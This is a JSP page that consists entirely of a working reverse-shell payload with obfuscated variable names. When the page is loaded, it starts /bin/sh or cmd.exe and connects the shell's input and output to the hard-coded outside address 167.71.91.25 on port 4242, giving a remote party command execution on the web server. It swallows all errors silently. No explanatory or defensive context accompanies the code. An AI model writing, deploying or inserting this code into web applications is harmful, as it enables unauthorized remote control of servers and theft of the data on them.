<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
  class StreamConnector extends Thread
  {
    InputStream b7;
    OutputStream aN;

    StreamConnector( InputStream b7, OutputStream aN )
    {
      this.b7 = b7;
      this.aN = aN;
    }

    public void run()
    {
      BufferedReader pz  = null;
      BufferedWriter qHV = null;
      try
      {
        pz  = new BufferedReader( new InputStreamReader( this.b7 ) );
        qHV = new BufferedWriter( new OutputStreamWriter( this.aN ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = pz.read( buffer, 0, buffer.length ) ) > 0 )
        {
          qHV.write( buffer, 0, length );
          qHV.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( pz != null )
          pz.close();
        if( qHV != null )
          qHV.close();
      } catch( Exception e ){}
    }
  }

  try
  {
    String ShellPath;
if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
  ShellPath = new String("/bin/sh");
} else {
  ShellPath = new String("cmd.exe");
}

    Socket socket = new Socket( "167.71.91.25", 4242 );
    Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%>
